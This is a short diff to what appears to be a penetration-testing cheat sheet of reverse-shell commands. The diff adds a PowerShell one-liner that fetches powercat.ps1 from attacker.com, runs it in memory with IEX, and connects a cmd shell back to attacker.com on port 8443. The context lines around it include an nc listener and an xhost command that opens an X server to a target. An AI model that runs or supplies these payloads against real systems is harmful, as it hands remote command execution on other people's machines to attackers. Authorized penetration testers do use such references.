@@ -1094,6 +1094,9 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 <br>```Xnest :1```
 <br>```xhost +targetip```
 
+<br># powershell (without download)
+<br>```echo IEX(New-Object Net.WebClient).DownloadString("http://attacker.com:8442/powercat.ps1") | powershell -noprofile; powercat -c attacker.com -p 8443 -e cmd```
+
 https://reverse-shell.sh/
 <br># Reverse Shell as a Service
 <br>```nc -l 1337```
